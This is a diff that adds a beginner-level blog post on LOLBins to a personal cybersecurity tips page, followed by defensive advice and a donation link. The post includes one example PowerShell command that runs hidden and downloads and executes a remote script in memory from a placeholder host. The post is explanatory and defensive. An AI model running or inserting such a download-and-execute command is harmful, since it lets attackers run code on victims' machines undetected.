@@ -57,5 +57,29 @@
     <p>3. Be careful of suspicious links and emails.</p>
     <p>Stay tuned for more tips as I continue learning and sharing!</p>
   </div>
+  <div class="section">
+    <h2>New Blog Post: What Are LOLBins?</h2>
+    <p>Most people think cyberattacks use viruses—but advanced hackers can attack without using any malware.</p>
+    <p>They use something called <strong>LOLBins</strong>: tools like <code>PowerShell</code> and <code>cmd.exe</code> that are already built into your computer.</p>
+
+    <p>Here's an example of a command that runs code without saving any files:</p>
+    <code style="display: block; background: #222; padding: 10px; border-radius: 6px; color: #00ff00;">
+      powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script')"
+    </code>
+
+    <p>These attacks are hard to detect because they look like normal admin activity. Defending against them means monitoring behavior—not just files.</p>
+
+    <h3 style="color:#00ffcc;">How to Defend:</h3>
+    <ul style="list-style: none; padding-left: 0;">
+      <li>• Watch for unusual use of built-in tools like PowerShell</li>
+      <li>• Use application allowlisting</li>
+      <li>• Train users to spot odd system behavior</li>
+    </ul>
+
+    <p>If you enjoyed this tip and want more advanced content, you can support me here:</p>
+    <a href="https://www.buymeacoffee.com/Lsec47" target="_blank" class="button">
+      Support My Cyber Journey
+    </a>
+  </div>
 </body>
 </html>
